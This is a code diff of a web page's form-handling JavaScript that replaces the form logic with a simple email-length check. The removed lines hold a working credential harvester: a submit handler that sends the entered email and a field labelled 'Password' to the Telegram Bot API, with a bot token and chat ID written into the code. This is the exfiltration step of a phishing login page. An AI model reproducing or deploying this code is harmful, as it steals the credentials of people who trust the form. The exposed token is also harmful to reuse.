@@ -165,67 +165,20 @@ $jQuerry(document).ready(($)=>{
 // #endregion
 
 // #region valide form
+const EMAIL_MIN_LENGTH = 5;
 
-function validateForm(event) {
-  event.preventDefault();
-  resetValidation();
-  
-  const email = window.inpEmail.value;
-  const name = window.inpName.value;
+function checkEmailLenght() {
+    const valueLenght = window.inpEmail.value.length;
+    const diff = valueLenght < EMAIL_MIN_LENGTH ? EMAIL_MIN_LENGTH - valueLenght : 0;
 
-  if(!email) {
-      window.emailHelp.classList.remove('d-none');
-      return false;
-  }
-  if(!name) {
-      window.nameHelp.classList.remove('d-none');
-      return false;
-  }
+    if(diff) {
+        window.emailDiffCount.textContent = diff;
+        window.emailLenghtHelp.classList.remove('d-none');
+    } else {
+        window.emailLenghtHelp.classList.add('d-none');
+    }
+};
 
-  if(!testPasswordRegex(name)) {
-      window.nameHelp.classList.remove('d-none');
-      window.nameHelpDescription.classList.remove('d-none');
-  }
-
-  
-  // console.log(email, password);
-}
-let apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
-let chatId = "-4066219312";
-async function formSubmit(event) {
-  event.preventDefault();
-
-  const email = window.inpEmail.value;
-  const name = window.inpName.value;
-
-  if(!email || !name) {
-      return false;
-  }
-  
-
-  let text = `
-  <b>Email:</b> ${email}<b>Password</b> ${name}
-  `;
-
-  let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage`;
-
-  const response = await fetch(urlString, {
-      method: 'post',
-      headers: {
-          'Accept': 'application/json',
-          'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-          chat_id: chatId,
-          text,
-          parse_mode: 'HTML'
-      })
-  });
-
-  const resp = await response.json();
-  console.log(resp);
- window.inputEmail.addEventListener('input', checkEmailLenght);
-document.addEventListener('DOMContentLoaded', checkEmailLenght);
-window.form.addEventListener('submit', formSubmit);
-}
+  window.inpEmail.addEventListener('input', checkEmailLenght)
+  document.addEventListener('DOMContentLoaded', checkEmailLenght)
   // #endregion
